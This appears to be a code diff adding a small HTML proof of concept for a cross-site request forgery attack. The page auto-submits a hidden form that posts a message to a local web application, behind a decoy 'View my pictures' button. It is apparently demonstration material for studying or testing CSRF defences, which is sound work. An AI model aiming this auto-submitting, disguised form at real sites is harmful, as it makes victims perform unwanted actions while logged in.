@@ -1,0 +1,11 @@
+<html>
+<head>
+</head>
+<body onload="document.forms[0].submit()">
+
+<form action="http://localhost:8080/messages" method="POST">
+<input type="hidden" name="message" value="CSRF Attack"/>
+<input type="submit" value="View my pictures"/>
+</form>
+</body>
+</html>
